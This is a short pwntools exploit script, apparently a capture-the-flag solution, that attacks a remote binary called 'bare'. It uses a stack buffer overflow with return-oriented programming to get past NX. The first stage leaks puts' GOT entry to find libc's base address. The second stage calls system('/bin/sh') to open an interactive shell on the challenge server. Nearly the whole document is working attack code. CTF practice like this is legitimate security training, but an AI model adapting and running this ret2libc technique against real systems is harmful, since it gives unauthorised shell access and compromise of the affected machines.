## NX Enabled , using ROP to bypass
## sol:  Call system('/bin/sh')
from pwn import *
from Crypto.Util.number import bytes_to_long
context.binary = './bare'
context.log_level = 'debug'

#r = process('./bare')
r = remote('chal.firebird.sh',35030)
binary = ELF('./bare')
# Using ROPgadget
pop_rdi = 0x40123b
puts_plt = binary.plt['puts']
puts_got = binary.got['puts']
bare = binary.sym['bare']

offset = 24

payload_1 = flat(
    b'A' * offset,
    p64(pop_rdi),
    puts_got,
    puts_plt,
    bare
)
r.recvuntil(b'?\n')
r.sendline(payload_1)

puts_leak = r.recvline().strip()

puts_leak = bytes_to_long(puts_leak[::-1])
#print(hex(puts_leak))

libc = ELF('libc6_2.23-0ubuntu11.3_amd64.so')
libc.address = puts_leak - libc.sym['puts']
## Consturct ROPgadget
system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh'))

payload_2 = flat(
    b'A' * offset,
    pop_rdi,
    bin_sh,
    p64(system)
)
r.recvuntil(b'?\n')
r.sendline(payload_2)
r.interactive()